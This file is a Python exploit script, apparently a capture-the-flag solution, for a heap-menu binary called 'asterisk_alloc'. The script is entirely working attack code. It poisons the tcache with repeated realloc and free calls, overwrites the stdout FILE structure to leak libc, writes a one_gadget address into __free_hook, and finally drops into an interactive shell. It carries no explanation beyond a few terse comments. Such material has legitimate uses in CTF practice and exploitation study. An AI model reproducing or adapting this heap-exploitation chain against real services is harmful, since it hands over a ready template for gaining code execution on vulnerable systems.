from ptrlib import *

def malloc(size, data):
    sock.sendlineafter("Your choice: ", "1")
    sock.sendlineafter(": ", str(size))
    sock.sendafter(": ", data)
    return

def calloc(size, data):
    sock.sendlineafter("Your choice: ", "2")
    sock.sendlineafter(": ", str(size))
    sock.sendafter(": ", data)
    return

def realloc(size, data='A'):
    sock.sendlineafter("Your choice: ", "3")
    sock.sendlineafter(": ", str(size))
    if size > 0:
        sock.sendafter(": ", data)
    return

def free(name):
    sock.sendlineafter("Your choice: ", "4")
    sock.sendlineafter("Which: ", name)
    return

libc = ELF("./libc.so.6")
libc_one_gadget = 0x4f322

while True:
    sock = Process("./asterisk_alloc")

    # libc leak
    realloc(0x38, 'A'*0x38)
    realloc(0)
    realloc(0x28, 'B'*0x28)
    realloc(0)
    realloc(0x18, 'C'*0x18)
    realloc(0)

    realloc(-1)
    realloc(0x500, "r")
    calloc(0x500, 'A')
    free('r')

    realloc(-1)
    realloc(0x18, '\x00')
    free('r')
    free('r')
    free('r')
    realloc(-1)
    realloc(0x18, '\xe0')
    realloc(-1)
    realloc(0x18, p64(0) + p64(0x21)) # bypass realloc check
    realloc(-1)
    #realloc(0x18, p64(0) + p64(0x21) + b'\x60\x07\xdd') # for DEASLR
    realloc(0x18, p64(0) + p64(0x21) + b'\x60\x47')

    realloc(-1)
    realloc(0x28, 'A' * 0x28)
    free('r')
    free('r')
    free('r')
    realloc(-1)
    realloc(0x28, '\xf0')
    realloc(-1)
    realloc(0x28, b'X' * 0x18 + p64(0x21)) # bypass free check
    realloc(-1)
    realloc(0x28, '\x00' * 0x28)
    payload = p64(0xfbad1880)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += b'\x88'
    try:
        malloc(0x28, payload)
        libc_base = u64(sock.recv(8)) - libc.symbol("_IO_2_1_stdout_") - 131
        assert 0x7f0000000000 < libc_base < 0x800000000000
        logger.info("libc base = " + hex(libc_base))
    except:
        continue

    # tcache poisoning
    realloc(-1)
    realloc(0x38, 'A')
    free('r')
    free('r')
    free('r')
    realloc(-1)
    realloc(0x38, p64(libc_base + libc.symbol("__free_hook")))
    realloc(-1)
    realloc(0x38, 'A')
    realloc(-1)
    realloc(0x38, p64(libc_base + libc_one_gadget))

    # get the shell!
    free('r')

    sock.interactive()
    exit()
